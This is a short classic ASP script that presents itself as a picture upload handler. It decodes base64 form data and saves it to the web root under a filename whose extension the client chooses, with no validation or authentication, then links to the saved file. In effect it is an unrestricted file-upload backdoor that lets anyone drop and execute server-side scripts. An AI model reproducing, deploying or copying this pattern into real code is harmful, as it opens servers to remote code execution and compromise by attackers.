<%@ LANGUAGE=VBScript CodePage=65001%> 
<%
private function decodeBase64(base64)  
   dim DM, EL  
   Set DM = CreateObject("Microsoft.XMLDOM")  
   Set EL = DM.createElement("tmp")  
   EL.DataType = "bin.base64" 
   EL.Text = base64  
   decodeBase64 = EL.NodeTypedValue  
end function 


dim data
dim ext
data=decodeBase64(request.Form("picData"))
ext=request.Form("picExt")

set stm=Server.CreateObject("ADODB.Stream")
'stm.Mode=adSaveCreateOverWrite 'adModeReadWrite
stm.type=1 
stm.open
stm.Write(data) 
stm.SaveToFile Server.MapPath("./") & "/" & "ajax" & ext,2 
stm.Close 
set stm=nothing 
response.write "<a href='ajax" & ext & "'>click here</a>"
response.end

%>